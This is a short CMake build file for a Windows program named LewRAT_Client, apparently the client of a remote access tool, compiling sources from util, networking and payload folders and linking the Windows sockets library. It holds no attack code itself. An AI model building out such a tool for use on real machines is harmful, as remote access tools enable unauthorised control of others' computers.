cmake_minimum_required(VERSION 3.3.2)

set(CMAKE_RUNTIME_OUTPUT_DIRECTORY bin/)

project(LewRAT_Client)

include_directories(./ util/ networking/ payload/)

set(SOURCES main.c util/util.c util/parson.c payload/system.c networking/networking.c)

add_executable(LewRAT_Client ${SOURCES})
target_link_libraries(LewRAT_Client ws2_32)